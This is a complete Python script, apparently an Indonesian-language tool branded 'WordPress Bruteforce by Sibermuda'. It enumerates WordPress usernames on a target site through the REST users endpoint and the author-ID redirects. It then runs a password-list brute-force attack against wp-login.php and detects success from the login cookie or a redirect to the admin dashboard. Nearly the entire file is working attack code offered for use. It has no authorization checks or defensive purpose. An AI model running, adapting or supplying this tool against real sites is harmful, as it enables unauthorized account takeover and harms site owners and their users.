import requests
import re
import os

# Warna untuk tampilan terminal
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# ASCII Art dari file yang dikirim
ascii_art = f"""{GREEN}
██╗    ██╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██║    ██║██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║ █╗ ██║██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██║███╗██║██╔═══╝ ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
╚███╔███╔╝██║     ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚══╝╚══╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
         {YELLOW}WordPress Bruteforce by Sibermuda{RESET}
"""

# Fungsi untuk mencari username otomatis
def get_usernames(target_url):
    users = []
    api_url = f"{target_url}/wp-json/wp/v2/users"
    response = requests.get(api_url)

    if response.status_code == 200:
        try:
            data = response.json()
            for user in data:
                if "slug" in user:
                    users.append(user["slug"])
        except Exception as e:
            print(f"{RED}[!] Error parsing JSON: {e}{RESET}")
    else:
        print(f"{YELLOW}[!] API tidak aktif, mencoba metode lain...{RESET}")
        for i in range(1, 11):  
            url = f"{target_url}/?author={i}"
            response = requests.get(url, allow_redirects=True)
            if response.status_code == 200:
                match = re.search(r"author/(.*?)/", response.url)
                if match:
                    username = match.group(1)
                    if username not in users:
                        users.append(username)
    
    return users

# Fungsi untuk memilih username dari hasil scanning
def pilih_username(usernames):
    if not usernames:
        print(f"{RED}[❌] Tidak ada username yang ditemukan.{RESET}")
        return None
    
    print(f"\n{BLUE}[🔎] Username yang ditemukan:{RESET}")
    for i, user in enumerate(usernames, start=1):
        print(f"   [{i}] {GREEN}{user}{RESET}")
    
    while True:
        try:
            pilihan = int(input(f"{YELLOW}[?] Pilih nomor username yang ingin digunakan: {RESET}"))
            if 1 <= pilihan <= len(usernames):
                return usernames[pilihan - 1]
            else:
                print(f"{RED}[!] Nomor tidak valid, coba lagi.{RESET}")
        except ValueError:
            print(f"{RED}[!] Masukkan angka yang benar.{RESET}")

# Fungsi untuk brute-force login dengan logging detail
def bruteforce_wp(target_url, username, password_file):
    login_url = f"{target_url}/wp-login.php"
    session = requests.Session()

    with open(password_file, "r") as file:
        for password in file:
            password = password.strip()
            data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{target_url}/wp-admin/",
                "testcookie": "1"
            }

            response = session.post(login_url, data=data, allow_redirects=True)
            
            # DEBUGGING - Tampilkan detail respons server
            print(f"\n{YELLOW}[DEBUG] Mencoba password: {password}{RESET}")
            print(f"    Status Code: {response.status_code}")
            print(f"    Redirect URL: {response.url}")
            print(f"    Cookies: {session.cookies.get_dict()}")
            print(f"    Response Text (potongan): {response.text[:200]}")  # Hanya tampilkan 200 karakter pertama
            
            # Cek cookie 'wordpress_logged_in'
            if "wordpress_logged_in" in session.cookies.get_dict():
                print(f"\n{GREEN}[🎉] Password ditemukan untuk {username}: {password}{RESET}")
                return password
            
            # Cek apakah diarahkan ke dashboard
            if "/wp-admin/" in response.url:
                print(f"\n{GREEN}[🎉] Password ditemukan untuk {username}: {password}{RESET}")
                return password

            print(f"{RED}[-] Gagal: {password}{RESET}")
    
    print(f"{RED}[!] Tidak ada password yang cocok untuk {username}.{RESET}")
    return None

# Main script
if __name__ == "__main__":
    os.system("clear")  # Bersihkan layar sebelum mulai
    print(ascii_art)

    target_url = input(f"{YELLOW}Masukkan URL target (contoh: https://example.com): {RESET}")
    password_file = input(f"{YELLOW}Masukkan path file password list: {RESET}")

    print(f"\n{BLUE}[🔎] Mencari username...{RESET}")
    usernames_ditemukan = get_usernames(target_url)

    username_terpilih = pilih_username(usernames_ditemukan)

    if username_terpilih:
        print(f"\n{GREEN}[🚀] Memulai brute-force dengan username: {username_terpilih}{RESET}")
        bruteforce_wp(target_url, username_terpilih, password_file)
    else:
        print(f"{RED}[❌] Tidak ada username yang bisa digunakan.{RESET}")
